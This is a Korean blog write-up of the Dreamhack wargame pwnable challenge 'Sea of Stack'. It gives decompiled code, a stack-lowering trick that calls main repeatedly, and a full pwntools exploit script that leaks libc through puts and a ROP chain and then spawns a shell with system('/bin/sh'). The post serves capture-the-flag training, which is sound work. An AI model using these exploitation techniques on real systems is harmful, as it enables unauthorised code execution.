---
published: true
image: /img
layout: post
title: "[Dreamhack] PWN Sea of Stack"
excerpt: "드림핵 포너블 Sea of Stack 문제풀이"
tags: [Dreamhack, pwnable, wargame, writeup]
math: true
date: 2024-08-17 14:00
---

드림핵 포너블 문제 Sea of Stack 문제 풀이다.

해당 문제를 보면 우분투 22.04기반 컨테이너에 동작하고 libc 파일이 주어진다.
prob 바이너리가 주어지며 이를 실행시키면 다음과 같은 동작을 가진다.

```c+
root@b87ade2e40ca:/home# ./prob
If you really want to give me a present, bring me that kind detective's heart.
> aaaaaaaaaaaaaaa
Sea of Stack
1. safe func
2. unsafe func
> 1
aaaaaaaaaaaaaaaaaaaaaaaa
```

기드라 디컴파일러를 통해 해당 바이너리를 열어보자. 메인함수의 코드는 매우 간단하다. 코드를 살펴보면 다음과 같다.
```c++
undefined8 main(void)

{
  int iVar1;
  undefined8 local_38;
  undefined8 *local_30;
  char local_28 [28];
  int local_c;
  
  proc_init();
  printf("If you really want to give me a present, bring me that kind detective\'s heart.\n> ") ;
  read_input(local_28,0x10);
  iVar1 = strcmp(local_28,"Decision2Solve");
  if ((iVar1 == 0) && (gotPresent == 0)) {
    read_input(&local_30,8);
    read_input(&local_38,6);
    *local_30 = local_38;
    gotPresent = 1;
  }
  print_menu();
  local_c = read_number();
  if (local_c == 1) {
    (*(code *)safe)();
  }
  else if (local_c == 2) {
    (*(code *)unsafe)();
  }
  return 0;
}
```

또한 safe함수와 unsafe함수는 다음과 같다.
```c++
void safe_func(void)

{
  undefined local_38 [48];
  
  read_input(local_38,0x29);
  memset(local_38,0,0x28);
  return;
}

void unsafe_func(void)

{
  undefined local_28 [32];
  
  read_input(local_28,0x10000);
  return;
}
```

우선 unsafe 함수에서 오버플로우가 가능하다. libc가 주어진 것으로 보아, libc 주소를 leak해 ROP 체이닝을 해야할 것으로 예상된다.

간단하게 unsafe 함수에서 오버플로우를 시도해본다. 0x10000만큼의 임의 값을 입력하면 오류가 발생하며 gdb를 통해 확인하면 스택의 크기를 벗어난 지점에 값을 쓰려고 하여 권한 문제가 발생한다.

여기서 재밌는 트릭을 사용한다. main함수의 if 구문을 보면 0x10만큼 입력받은 문자열이 Decision2Solve와 동일한지 검사하여 동일하면 입력한 주소 부분에 원하는 값을 6만큼 쓸 수 있다.

취약점 트리거를 해야하는 unsafe함수를 이용해야 한다. 따라서 safe 함수 위치를 main함수 주소로 덮어 main을 여러번 call 한다. 

필자는 1000번의 call을 진행했으며 첫번째 실행의 rsp, rbp와 1000번을 실행한 rsp, rbp를 비교해보자.

```c++
//첫번째 main함수 지점 레지스터
*RAX  0x401446 (main) ◂— endbr64 
 RBX  0
 RCX  0x7d89cf314992 (read+18) ◂— cmp rax, -0x1000 /* 'H=' */
*RDX  0x404010 (safe) —▸ 0x4013f0 (safe_func) ◂— endbr64 
 RDI  0
 RSI  0x7fffe0176627 ◂— 0x60000000100
 R8   0x51
 R9   0x7d89cf521040 (_dl_fini) ◂— endbr64 
 R10  0x402048 ◂— "If you really want to give me a present, bring me that kind detective's heart.\n> "
 R11  0x246
 R12  0x7fffe0176788 —▸ 0x7fffe0176fd3 ◂— 0x4c00626f72702f2e /* './prob' */
 R13  0x401446 (main) ◂— endbr64 
 R14  0x403d98 (__do_global_dtors_aux_fini_array_entry) —▸ 0x401200 (__do_global_dtors_aux) ◂— endbr64 
 R15  0x7d89cf555040 (_rtld_global) —▸ 0x7d89cf5562e0 ◂— 0
*RBP  0x7fffe0176670 ◂— 1
*RSP  0x7fffe0176640 —▸ 0x401446 (main) ◂— endbr64 
*RIP  0x4014ca (main+132) ◂— mov qword ptr [rdx], rax


//1000번 main 호출 이후 main함수 지점 레지스터
*RAX  0
 RBX  0
*RCX  0x7fffe0166bd1 ◂— 0x4600007fffe01767
*RDX  0x401426 (unsafe_func) ◂— endbr64 
*RDI  0xa
*RSI  2
*R8   0x1999999999999999
*R9   0
*R10  0x7d89cf3beac0 ◂— 0x100000000
*R11  0x7d89cf3bf3c0 ◂— 0x2000200020002
 R12  0x7fffe0176788 —▸ 0x7fffe0176fd3 ◂— 0x4c00626f72702f2e /* './prob' */
 R13  0x401446 (main) ◂— endbr64 
 R14  0x403d98 (__do_global_dtors_aux_fini_array_entry) —▸ 0x401200 (__do_global_dtors_aux) ◂— endbr64 
 R15  0x7d89cf555040 (_rtld_global) —▸ 0x7d89cf5562e0 ◂— 0
*RBP  0x7fffe0166bf0 —▸ 0x7fffe0166c30 —▸ 0x7fffe0166c70 —▸ 0x7fffe0166cb0 —▸ 0x7fffe0166cf0 ◂— ...
*RSP  0x7fffe0166bf0 —▸ 0x7fffe0166c30 —▸ 0x7fffe0166c70 —▸ 0x7fffe0166cb0 —▸ 0x7fffe0166cf0 ◂— ...
*RIP  0x40142e (unsafe_func+8) ◂— sub rsp, 0x20
```

위와 같이 rbp, rsp 값이 현저히 낮아진 것을 볼 수 있다. 스택 위치가 낮아짐에 따라서 0x10000값을 입력하여 오버플로우 공격이 가능하다.

카나리도 안걸려 있기 때문에 이후는 일반적인 ROP와 동일하다. 함수의 인자를 주기 위해 pop rdi; ret;가젯을 찾아준다. 이를 통해 puts 함수의 plt와 got를 이용해서 libc 주소를 leak 한다. 이후 다시 unsafe 함수를 호출하여 가젯을 이용해 /bin/sh를 인자로 하여 system함수를 실행한다.

아래는 익스플로잇 코드이다.


```python
from pwn import *
context.update(arch='amd64', os='linux')
#p = remote("host3.dreamhack.games", 19571)
p = process("./prob", env={'LD_PRELOAD': './libc.so.6'})
# p = process("./prob")
libc = ELF("./libc.so.6")


p.sendafter(b"> ", b"Decision2Solve\x00\x00")

safe_addr = 0x404010
main_addr = 0x401446

p.send(p64(safe_addr))
p.send(b"\x46\x14\x40\x00\x00\x00")
p.sendafter(b"> ", b"1")

print(p.recv(79))

i = 0
while True:
    if (i == 1000):
        break
    p.sendafter(b"> ", b"a"*0x10)
    p.sendafter(b"> ", b"1")
    # sleep(0.01)
    i += 1
    print(i)

p.sendafter(b"> ", b"/bin/cat /flag\x00\x00")
print("1")

puts_plt = 0x04010c0
puts_got = 0x403fa8
prdi_prbp_ret = 0x40129b
unsafe_func = 0x0401426

p.sendafter(b"> ", b"2")

pl = b"a"*32
pl += b"b"*8
pl += p64(0x40129e)
pl += p64(prdi_prbp_ret)
pl += p64(puts_got)
pl += b"c"*8
pl += p64(puts_plt)
pl += p64(unsafe_func)
pl += b"c"*(0x10000-len(pl))

p.send(pl)

libc_leak = u64(p.recv(6)[:]+b"\x00\x00")
print(f"[+] leak addr : {hex(libc_leak)}")
offset = 0x58ED0
libc_base = libc_leak - offset
print(f"[+] libc base addr : {hex(libc_base)}")
system = libc_base+0x28D64
print(f"[+] system addr : {hex(system)}")
binsh = libc_base+0x1B0698
print(f"[+] /bin/sh addr : {hex(binsh)}")

exit = 0x04012f6

pl = p64(binsh)*4
pl += p64(binsh)
pl += p64(0x40129e)
pl += p64(0x40129e)
pl += p64(0x40129e)
pl += p64(0x40129e)
pl += p64(prdi_prbp_ret)
pl += p64(binsh)
pl += p64(binsh)
pl += p64(system)
pl += p64(exit)
pl += b"\x00"*(0x10000-len(pl))


p.send(pl)
p.interactive()
```